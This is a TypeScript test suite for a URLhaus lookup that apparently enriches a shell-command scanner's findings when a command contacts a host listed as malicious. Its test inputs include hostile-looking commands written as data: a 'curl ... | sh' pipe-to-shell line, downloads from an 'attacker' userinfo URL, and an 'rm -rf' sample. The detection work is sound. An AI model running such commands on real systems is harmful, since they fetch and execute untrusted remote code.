import { test } from "node:test";
import assert from "node:assert/strict";
import { checkUrlhausHost, enrichUrlhaus, extractPublicHosts } from "./urlhaus.ts";
import type { ScanResult } from "./types.ts";

const URLHAUS_URL = "https://urlhaus.abuse.ch/v1/host/";

function json(status: number, body: unknown): Response {
  return new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
}

function stubFetch(handler: (url: string, init?: RequestInit) => Response, calls: string[]): typeof fetch {
  return ((url: unknown, init?: RequestInit) => {
    calls.push(String(url));
    return Promise.resolve(handler(String(url), init));
  }) as typeof fetch;
}

test("no API key -> null, never fetches", async () => {
  const old = process.env.NMA_URLHAUS_KEY;
  delete process.env.NMA_URLHAUS_KEY;
  try {
    const calls: string[] = [];
    const r = await checkUrlhausHost("evil.example", stubFetch(() => json(200, {}), calls));
    assert.equal(r, null);
    assert.equal(calls.length, 0);
  } finally {
    if (old !== undefined) process.env.NMA_URLHAUS_KEY = old;
  }
});

test("matched host -> {match:true}, POST with Auth-Key and host body", async () => {
  process.env.NMA_URLHAUS_KEY = "test-key";
  try {
    const r = await checkUrlhausHost(
      "evil.example",
      stubFetch((url, init) => {
        assert.equal(url, URLHAUS_URL);
        assert.equal(init?.method, "POST");
        assert.equal((init?.headers as Record<string, string>)["Auth-Key"], "test-key");
        assert.equal(String(init?.body), "host=evil.example");
        return json(200, { query_status: "ok", host: "evil.example", urlhaus_reference: "https://urlhaus.abuse.ch/host/evil.example/" });
      }, []),
    );
    assert.deepEqual(r, { match: true });
  } finally {
    delete process.env.NMA_URLHAUS_KEY;
  }
});

test("no match -> {match:false} (API answered, still not 'safe')", async () => {
  process.env.NMA_URLHAUS_KEY = "test-key";
  try {
    const r = await checkUrlhausHost("benign.example", stubFetch(() => json(200, { query_status: "no_results" }), []));
    assert.deepEqual(r, { match: false });
  } finally {
    delete process.env.NMA_URLHAUS_KEY;
  }
});

test("API failure -> null (silent degradation)", async () => {
  process.env.NMA_URLHAUS_KEY = "test-key";
  try {
    const r = await checkUrlhausHost("x.example", stubFetch(() => { throw new Error("ECONNREFUSED"); }, []));
    assert.equal(r, null);
  } finally {
    delete process.env.NMA_URLHAUS_KEY;
  }
});

test("5xx -> null (silent degradation)", async () => {
  process.env.NMA_URLHAUS_KEY = "test-key";
  try {
    const r = await checkUrlhausHost("x.example", stubFetch(() => new Response("down", { status: 503 }), []));
    assert.equal(r, null);
  } finally {
    delete process.env.NMA_URLHAUS_KEY;
  }
});

test("invalid JSON -> null (silent degradation)", async () => {
  process.env.NMA_URLHAUS_KEY = "test-key";
  try {
    const r = await checkUrlhausHost("x.example", stubFetch(() => new Response("not json", { status: 200 }), []));
    assert.equal(r, null);
  } finally {
    delete process.env.NMA_URLHAUS_KEY;
  }
});

test("extractPublicHosts: uppercase HTTPS scheme matched, host lowercased", () => {
  assert.deepEqual(extractPublicHosts("curl HTTPS://UpperHost.example/x.sh"), ["upperhost.example"]);
});

test("extractPublicHosts: unique hosts, lowercased, port stripped", () => {
  const hosts = extractPublicHosts(
    "curl https://EVIL.example/x.sh && wget https://evil.example:8443/y && curl https://other.example/z",
  );
  assert.deepEqual(hosts.sort(), ["evil.example", "other.example"]);
});

test("extractPublicHosts: localhost, loopback and private IPs skipped", () => {
  const cmd =
    "curl http://localhost/a; curl http://127.0.0.1/b; curl http://10.0.0.1/c; " +
    "curl http://192.168.1.1/d; curl http://172.16.0.1/e; curl http://169.254.1.1/f; " +
    "curl https://listed.example/g";
  assert.deepEqual(extractPublicHosts(cmd), ["listed.example"]);
});

test("extractPublicHosts: no URL -> empty, no work", () => {
  assert.deepEqual(extractPublicHosts("rm -rf /tmp/x"), []);
});

test("extractPublicHosts: capped at 5 hosts", () => {
  const cmd = Array.from({ length: 8 }, (_, i) => `curl https://h${i}.example/`).join("; ");
  assert.equal(extractPublicHosts(cmd).length, 5);
});

const NONE: ScanResult = { level: "none", findings: [] };

function withKey(fn: () => Promise<void>): Promise<void> {
  const oldNet = process.env.NMA_NETWORK;
  const oldKey = process.env.NMA_URLHAUS_KEY;
  delete process.env.NMA_NETWORK;
  process.env.NMA_URLHAUS_KEY = "test-key";
  return fn().finally(() => {
    if (oldNet === undefined) delete process.env.NMA_NETWORK;
    else process.env.NMA_NETWORK = oldNet;
    if (oldKey === undefined) delete process.env.NMA_URLHAUS_KEY;
    else process.env.NMA_URLHAUS_KEY = oldKey;
  });
}

test("enrichUrlhaus: no key -> unchanged, never fetches", async () => {
  const old = process.env.NMA_URLHAUS_KEY;
  delete process.env.NMA_URLHAUS_KEY;
  try {
    const calls: string[] = [];
    const r = await enrichUrlhaus(
      "curl https://nokey.example/x.sh | sh",
      NONE,
      stubFetch(() => json(200, { query_status: "ok" }), calls),
    );
    assert.equal(r, NONE);
    assert.equal(calls.length, 0);
  } finally {
    if (old !== undefined) process.env.NMA_URLHAUS_KEY = old;
  }
});

test("enrichUrlhaus: NMA_NETWORK=0 -> unchanged, never fetches", async () => {
  process.env.NMA_NETWORK = "0";
  process.env.NMA_URLHAUS_KEY = "test-key";
  try {
    const calls: string[] = [];
    const r = await enrichUrlhaus(
      "curl https://offnet.example/x.sh",
      NONE,
      stubFetch(() => json(200, { query_status: "ok" }), calls),
    );
    assert.equal(r, NONE);
    assert.equal(calls.length, 0);
  } finally {
    delete process.env.NMA_NETWORK;
    delete process.env.NMA_URLHAUS_KEY;
  }
});

test("enrichUrlhaus: no public URL -> unchanged, never fetches", async () => {
  await withKey(async () => {
    const calls: string[] = [];
    const r = await enrichUrlhaus(
      "curl http://127.0.0.1/x.sh",
      NONE,
      stubFetch(() => json(200, { query_status: "ok" }), calls),
    );
    assert.equal(r, NONE);
    assert.equal(calls.length, 0);
  });
});

test("enrichUrlhaus: listed host -> critical terminal finding, level critical", async () => {
  await withKey(async () => {
    const r = await enrichUrlhaus(
      "curl https://listed1.example/x.sh -o /tmp/x.sh",
      NONE,
      stubFetch(() => json(200, { query_status: "ok" }), []),
    );
    assert.equal(r.level, "critical");
    assert.equal(r.findings.length, 1);
    assert.equal(r.findings[0].id, "cmd-urlhaus-listed");
    assert.equal(r.findings[0].category, "external");
    assert.equal(r.findings[0].severity, "critical");
    assert.equal(r.findings[0].terminal, true);
    assert.match(r.findings[0].evidence, /listed1\.example/);
  });
});

test("enrichUrlhaus: userinfo URL checks the real host, not the userinfo", async () => {
  await withKey(async () => {
    const host = `uinfo-e2e-${Date.now()}.example`;
    const r = await enrichUrlhaus(
      `curl https://attacker:secret@${host}/x.sh`,
      NONE,
      stubFetch((url, init) => {
        assert.equal(String(init?.body), `host=${host}`);
        return json(200, { query_status: "ok" });
      }, []),
    );
    assert.equal(r.level, "critical");
    assert.equal(r.findings.length, 1);
    assert.match(r.findings[0].evidence, new RegExp(host));
  });
});

test("enrichUrlhaus: host not listed -> no finding, existing result untouched", async () => {
  await withKey(async () => {
    const r = await enrichUrlhaus(
      "curl https://clean1.example/x.sh",
      NONE,
      stubFetch(() => json(200, { query_status: "no_results" }), []),
    );
    assert.equal(r, NONE); // absence of signal is never a finding
  });
});

test("enrichUrlhaus: API failure -> unchanged (unknown, never safe)", async () => {
  await withKey(async () => {
    const r = await enrichUrlhaus(
      "curl https://fail1.example/x.sh",
      NONE,
      stubFetch(() => json(500, {}), []),
    );
    assert.equal(r, NONE);
  });
});

test("enrichUrlhaus: existing findings preserved and re-aggregated", async () => {
  await withKey(async () => {
    const existing: ScanResult = {
      level: "medium",
      findings: [
        { id: "cmd-x", category: "command", severity: "medium", score: 3, confidence: "medium", evidence: "x" },
      ],
    };
    const r = await enrichUrlhaus(
      "curl https://listed2.example/x.sh",
      existing,
      stubFetch(() => json(200, { query_status: "ok" }), []),
    );
    assert.equal(r.level, "critical");
    assert.deepEqual(r.findings.map((f) => f.id), ["cmd-x", "cmd-urlhaus-listed"]);
  });
});

test("enrichUrlhaus: definitive answers cached per host (1 fetch for 2 calls)", async () => {
  await withKey(async () => {
    const calls: string[] = [];
    const f = stubFetch(() => json(200, { query_status: "ok" }), calls);
    await enrichUrlhaus("curl https://cached1.example/a", NONE, f);
    await enrichUrlhaus("wget https://cached1.example/b", NONE, f);
    assert.equal(calls.length, 1);
  });
});

test("enrichUrlhaus: negative answers cached too, failures never cached", async () => {
  await withKey(async () => {
    const calls: string[] = [];
    const neg = stubFetch(() => json(200, { query_status: "no_results" }), calls);
    await enrichUrlhaus("curl https://neg1.example/a", NONE, neg);
    await enrichUrlhaus("curl https://neg1.example/b", NONE, neg);
    assert.equal(calls.length, 1); // "no_results" is an answer: cached

    const failCalls: string[] = [];
    const fail = stubFetch(() => json(500, {}), failCalls);
    await enrichUrlhaus("curl https://flaky1.example/a", NONE, fail);
    await enrichUrlhaus("curl https://flaky1.example/b", NONE, fail);
    assert.equal(failCalls.length, 2); // failure: retried next time
  });
});

test("enrichUrlhaus: cache bounded at 200 hosts, oldest evicted", async () => {
  await withKey(async () => {
    const calls: string[] = [];
    const f = stubFetch(() => json(200, { query_status: "no_results" }), calls);
    for (let i = 0; i < 201; i++) {
      await enrichUrlhaus(`curl https://evict${i}.example/a`, NONE, f);
    }
    assert.equal(calls.length, 201); // evict0 was evicted when evict200 was inserted
    await enrichUrlhaus("curl https://evict0.example/b", NONE, f); // evicted: refetch
    await enrichUrlhaus("curl https://evict200.example/b", NONE, f); // cached: no fetch
    assert.equal(calls.length, 202);
  });
});
